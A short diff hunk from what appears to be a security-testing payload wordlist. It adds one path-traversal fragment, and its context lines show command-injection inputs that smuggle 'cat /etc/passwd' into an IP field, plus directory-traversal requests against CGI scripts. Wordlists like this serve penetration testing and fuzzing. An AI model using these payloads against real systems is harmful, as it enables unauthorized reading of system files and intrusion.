@@ -14479,6 +14479,7 @@ $(`cat /etc/passwd`)
 127.0.0.1 & cat /etc/passwd
 127.0.0.1 && cat /etc/passwd
 127.0.0.1; cat /etc/passwd
+1314520../
 14all-1.1.cgi?cfg=../../../../../../../../etc/passwd
 14all-1.1.cgi?cfg=../../../../../../../..{knownfile}
 14all.cgi?cfg=../../../../../../../../etc/passwd
